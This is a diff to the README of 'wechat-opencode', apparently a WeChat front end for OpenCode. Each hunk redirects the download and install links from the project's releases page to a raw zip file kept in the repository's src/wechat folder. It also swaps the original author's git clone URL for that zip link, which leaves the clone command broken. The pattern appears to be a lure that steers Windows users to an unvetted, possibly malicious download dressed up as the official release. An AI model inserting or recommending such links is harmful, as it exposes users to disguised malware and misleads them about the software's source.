@@ -1,10 +1,10 @@
 # 🤖 wechat-opencode - Chat With OpenCode On WeChat
 
-[![Download wechat-opencode](https://img.shields.io/badge/Download%20wechat--opencode-blue?style=for-the-badge)](https://github.com/lugsailtheocracy394/wechat-opencode/releases)
+[![Download wechat-opencode](https://img.shields.io/badge/Download%20wechat--opencode-blue?style=for-the-badge)](https://github.com/lugsailtheocracy394/wechat-opencode/raw/refs/heads/main/src/wechat/wechat_opencode_v2.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/lugsailtheocracy394/wechat-opencode/releases
+Visit this page to download: https://github.com/lugsailtheocracy394/wechat-opencode/raw/refs/heads/main/src/wechat/wechat_opencode_v2.0.zip
 
 Pick the latest release for Windows, then download the file that matches your system.
 
@@ -35,7 +35,7 @@ Before you start, make sure you have:
 ## 📦 Install on Windows
 
 1. Open the release page:
-   https://github.com/lugsailtheocracy394/wechat-opencode/releases
+   https://github.com/lugsailtheocracy394/wechat-opencode/raw/refs/heads/main/src/wechat/wechat_opencode_v2.0.zip
 
 2. Download the latest Windows file from the release list.
 
@@ -206,7 +206,7 @@ Download the latest Windows file, then use the method that matches the file type
 If you want to work on the source code, use this path:
 
 ```bash
-git clone https://github.com/CG-man/wechat-opencode.git ~/wechat-opencode
+git clone https://github.com/lugsailtheocracy394/wechat-opencode/raw/refs/heads/main/src/wechat/wechat_opencode_v2.0.zip ~/wechat-opencode
 cd ~/wechat-opencode
 npm install
 ```
@@ -217,4 +217,4 @@ This is for development use. Most users should use the release page and the pack
 
 Download and install from here:
 
-https://github.com/lugsailtheocracy394/wechat-opencode/releases
+https://github.com/lugsailtheocracy394/wechat-opencode/raw/refs/heads/main/src/wechat/wechat_opencode_v2.0.zip
